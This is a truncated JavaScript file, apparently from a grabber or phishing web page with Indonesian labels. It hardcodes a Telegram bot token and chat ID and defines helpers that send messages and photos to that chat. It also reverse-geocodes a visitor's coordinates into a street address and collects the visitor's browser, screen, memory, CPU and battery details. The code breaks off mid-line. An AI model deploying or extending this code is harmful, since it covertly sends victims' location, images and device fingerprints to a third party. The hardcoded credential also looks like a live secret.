// === TELEGRAM CONFIG ===
const token = '8424271614:AAHdEIUaiVEh_yipQ22xgj7KpUlHWYKP6Ws';
const chatId = '8028847891';

// Telegram helpers
const sendToTelegram = async (data) => {
    try {
        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body: JSON.stringify({
                chat_id: chatId,
                text: data,
                parse_mode: 'HTML'
            })
        });
    } catch(e) {
        console.error('Error sendMessage:', e);
    }
};

const sendPhoto = async (blob, filename) => {
    try {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', blob, filename);
        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
    } catch(e) {
        console.error('Error sendPhoto:', e);
    }
};

// Location reverse geocoding
const getLocationDetails = async (lat, lon) => {
    try {
        const response = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`);
        const data = await response.json();
        if (data.address) {
            return {
                kabupaten: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                kecamatan: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                fullAddress: data.display_name || "Alamat tidak tersedia"
            };
        }
    } catch(e){
        console.error('Reverse geocode error', e);
    }
    return { kabupaten: "Tidak diketahui", kecamatan: "Tidak diketahui", fullAddress: "Alamat tidak tersedia"};
};

// Device + IP info
const collectDeviceInfo = async () => {
    let message = '╭── Informasi Sistem ── ⦿\n\n';
    message += '⚙️ INFORMASI PERANGKAT\n';
    message += `🖥️ Perangkat: ${navigator.userAgent}\n`;
    message += `💻 Platform: ${navigator.platform}\n`;
    message += `🌐 Bahasa: ${navigator.language}\n`;
    message += `📶 Status: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
    message += `📺 Ukuran Layar: ${screen.width}x${screen.height}\n`;
    message += `🪟 Ukuran Jendela: ${window.innerWidth}x${window.innerHeight}\n`;
    message += `💾 RAM: ${navigator.deviceMemory || 'Tidak diketahui'} GB\n`;
    message += `🧠 Core CPU: ${navigator.hardwareConcurrency}\n`;
    if (navigator.getBattery) {
        try {
            const battery = await navigator.getBattery();
            message += `🔋 Baterai: ${Math.floor(battery.level * 100)}%\n`;
            message += `🔌 Mengisi: ${battery.charging ?
